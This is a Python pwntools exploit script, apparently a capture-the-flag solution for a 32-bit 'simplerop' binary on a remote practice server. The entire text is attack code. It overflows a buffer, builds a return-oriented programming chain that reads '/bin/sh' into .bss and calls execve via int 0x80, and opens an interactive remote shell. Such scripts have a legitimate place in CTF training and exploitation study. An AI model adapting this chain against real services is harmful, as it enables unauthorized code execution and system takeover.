from pwn import *
r = remote('node3.buuoj.cn',26394)
elf = ELF('./simplerop')
read_plt = elf.symbols['read']
bss_addr = elf.bss()
pop_edx_ecx_ebx_ret = 0x0806e850
pop_eax_ret = 0x080bae06
int80 = 0x080493e1
payload = 'a'*0x1c+'fuck'+p32(read_plt)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(bss_addr)+p32(0x8)
payload += p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss_addr)
payload += p32(pop_eax_ret)+p32(11)+p32(int80)
r.sendlineafter(' :', payload)
r.sendline('/bin/sh\x00')
r.interactive()
